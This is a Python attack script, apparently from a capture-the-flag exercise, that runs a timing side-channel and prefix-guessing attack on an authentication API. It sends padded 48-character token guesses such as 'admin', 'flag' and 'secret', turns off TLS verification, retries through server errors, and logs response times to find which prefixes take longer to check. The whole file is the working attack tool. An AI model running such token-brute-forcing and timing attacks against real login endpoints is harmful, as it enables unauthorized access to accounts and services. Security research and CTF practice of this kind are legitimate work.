import requests
import string
import time
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io"
s = requests.Session()
s.verify = False

def do_post(token, delay=3.0):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = s.post(f"{BASE_URL}/api/authenticate", json={"token": token}, timeout=10)
            dt = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                time.sleep(3.5)
                continue
            return dt, r.status_code, r.headers, r.text
        except Exception as e:
            time.sleep(3.5)

prefixes = [
    "ns", "NS", "Neuro", "neuro", "serve", "SERVE",
    "token", "TOKEN", "admin", "ADMIN", "secret", "SECRET",
    "key", "KEY", "flag", "FLAG", "ctf", "CTF",
    "bearer", "BEARER", "model", "MODEL", "gateway", "GATEWAY",
    "ai", "AI", "v1", "v2", "v3", "prod", "PROD", "master", "MASTER"
]

print("=== KIỂM TRA CÁC PREFIX PHỔ BIẾN (48 KÝ TỰ) ===")
for p in prefixes:
    tok = p + "0" * (48 - len(p))
    dt, status, headers, body = do_post(tok)
    print(f"Prefix '{p:8s}' -> Status: {status}, Time: {dt:.2f}ms, Len: {len(body)}, Body: {body.strip()}")
